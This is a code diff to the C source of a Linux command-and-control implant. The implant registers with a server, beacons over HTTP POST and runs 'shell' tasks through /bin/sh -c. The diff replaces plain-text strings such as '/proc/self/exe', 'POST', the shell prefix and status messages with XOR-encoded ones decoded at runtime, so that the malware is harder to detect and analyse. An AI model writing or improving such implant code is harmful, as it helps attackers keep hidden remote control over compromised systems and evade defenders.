@@ -34,8 +34,10 @@ static void collect_sysinfo(implant_metadata_t *meta) {
     if (pw && pw->pw_name)
         strncpy(meta->username, pw->pw_name, sizeof(meta->username) - 1);
 
+    char proc_self[ENC_LX_PROC_SELF_EXE_LEN + 1];
+    xor_dec(proc_self, ENC_LX_PROC_SELF_EXE, ENC_LX_PROC_SELF_EXE_LEN);
     char exe[256] = {0};
-    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
+    ssize_t len = readlink(proc_self, exe, sizeof(exe) - 1);
     if (len > 0) {
         exe[len] = '\0';
         strncpy(meta->process_name, exe, sizeof(meta->process_name) - 1);
@@ -73,8 +75,11 @@ static int do_register(const char *pubkey_pem, const implant_metadata_t *meta) {
     char path[64];
     xor_dec(path, ENC_PATH_REGISTER, ENC_PATH_REGISTER_LEN);
 
+    char method_post[ENC_HTTP_POST_LEN + 1];
+    xor_dec(method_post, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
+
     uint8_t resp[64];
-    int ret = http_request("POST", path, encrypted, enc_len, resp, sizeof(resp));
+    int ret = http_request(method_post, path, encrypted, enc_len, resp, sizeof(resp));
     return (ret >= 0) ? 0 : -1;
 }
 
@@ -139,8 +144,11 @@ static void send_task_result(uint32_t beacon_id, const uint8_t *session_key,
     char path[64];
     xor_dec(path, ENC_PATH_RESULT, ENC_PATH_RESULT_LEN);
 
+    char method_post[ENC_HTTP_POST_LEN + 1];
+    xor_dec(method_post, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
+
     uint8_t resp[64];
-    http_request("POST", path, body, body_len, resp, sizeof(resp));
+    http_request(method_post, path, body, body_len, resp, sizeof(resp));
     free(body);
 }
 
@@ -152,12 +160,15 @@ static void handle_run(const task_header_t *hdr, const uint8_t *data) {
     if (!builtin_out) return;
     builtin_out[0] = '\0';
 
+    char shell_pfx[ENC_SHELL_PREFIX_LEN + 1];
+    xor_dec(shell_pfx, ENC_SHELL_PREFIX, ENC_SHELL_PREFIX_LEN);
+
     if (builtin_dispatch(cmd, builtin_out, MAX_CMD_OUTPUT)) {
         size_t out_len = strlen(builtin_out);
         send_task_result(g_beacon_id, g_session_key, hdr,
                          builtin_out, out_len, FLAG_NONE);
         free(builtin_out);
-    } else if (strncmp(cmd, "shell ", 6) == 0) {
+    } else if (strncmp(cmd, shell_pfx, ENC_SHELL_PREFIX_LEN) == 0) {
         free(builtin_out);
         /* "shell <cmd>" prefix -> /bin/sh -c */
         size_t out_len = 0;
@@ -184,13 +195,17 @@ static void handle_set(const task_header_t *hdr, const uint8_t *data) {
     g_sleep_sec = interval;
     g_jitter_pct = jitter;
 
+    char sleep_msg[ENC_LX_SLEEP_UPDATED_LEN + 1];
+    xor_dec(sleep_msg, ENC_LX_SLEEP_UPDATED, ENC_LX_SLEEP_UPDATED_LEN);
     send_task_result(g_beacon_id, g_session_key, hdr,
-                     "sleep updated", 13, FLAG_NONE);
+                     sleep_msg, ENC_LX_SLEEP_UPDATED_LEN, FLAG_NONE);
 }
 
 static void handle_unsupported(const task_header_t *hdr) {
+    char fmt[ENC_LX_TASK_UNSUP_LEN + 1];
+    xor_dec(fmt, ENC_LX_TASK_UNSUP, ENC_LX_TASK_UNSUP_LEN);
     char msg[64];
-    snprintf(msg, sizeof(msg), "task type %d not supported on Linux", hdr->type);
+    snprintf(msg, sizeof(msg), fmt, hdr->type);
     send_task_result(g_beacon_id, g_session_key, hdr,
                      msg, strlen(msg), FLAG_ERROR);
 }
@@ -226,13 +241,16 @@ static void dispatch_tasks(const uint8_t *data, size_t data_len) {
         offset += hdr.length;
 
         switch (hdr.type) {
-        case TASK_EXIT:
+        case TASK_EXIT: {
+            char exit_msg[ENC_LX_EXITING_LEN + 1];
+            xor_dec(exit_msg, ENC_LX_EXITING, ENC_LX_EXITING_LEN);
             send_task_result(g_beacon_id, g_session_key, &hdr,
-                             "exiting", 7, FLAG_NONE);
+                             exit_msg, ENC_LX_EXITING_LEN, FLAG_NONE);
             crypto_free();
             http_cleanup();
             exit(0);
             break;
+        }
         case TASK_SET:
             handle_set(&hdr, task_data);
             break;
@@ -349,6 +367,9 @@ int main(int argc, char *argv[]) {
     char path_checkin[64];
     xor_dec(path_checkin, ENC_PATH_CHECKIN, ENC_PATH_CHECKIN_LEN);
 
+    char method_post[ENC_HTTP_POST_LEN + 1];
+    xor_dec(method_post, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
+
     for (;;) {
         uint8_t checkin_body[4];
         checkin_body[0] = (uint8_t)(g_beacon_id & 0xFF);
@@ -359,7 +380,7 @@ int main(int argc, char *argv[]) {
         uint8_t *resp = malloc(MAX_RESP_SIZE);
         if (!resp) { do_sleep(); continue; }
 
-        int resp_len = http_request("POST", path_checkin,
+        int resp_len = http_request(method_post, path_checkin,
                                     checkin_body, 4, resp, MAX_RESP_SIZE);
 
         if (resp_len > 48) {
